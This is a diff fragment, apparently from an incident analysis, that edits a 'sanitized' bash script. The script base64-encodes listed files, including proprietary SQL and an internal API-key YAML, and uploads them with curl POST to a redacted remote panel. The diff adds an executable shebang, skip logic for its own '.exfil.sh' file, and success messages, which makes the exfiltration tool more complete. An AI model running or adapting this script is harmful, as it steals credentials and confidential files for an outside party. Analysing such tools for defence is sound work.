@@ -73,9 +73,11 @@ Base64 encoding of file contents
 A sanitized representation of the relevant logic looked like:
 
 ```
+
+#!/bin/bash
+# aetherflow staging dump - vex 05/30
 PANEL="[REDACTED]"
 KEY="[REDACTED]"
-
 
 TARGETS=(
     "route_algorithms_PROPRIETARY.sql"
@@ -83,15 +85,18 @@ TARGETS=(
     "api_keys_internal.yaml"
 )
 
-
 for f in "${TARGETS[@]}"; do
+    [ -f "$f" ] || continue
+    # dont upload ourselves lol
+    [ "$f" = ".exfil.sh" ] && continue
     b64=$(base64 -w0 "$f")
-
-
     curl -s -X POST "${PANEL}/api.php?action=upload" \
-        -H "X-Panel-Key: [REDACTED]" \
+        -H "X-Panel-Key: ${KEY}" \
         -d "chunk=${b64}&fname=${f}&tag=aetherflow"
+    echo "[+] sent: $f"
 done
+
+# TODO: delete this before zipping
 
 ```
 
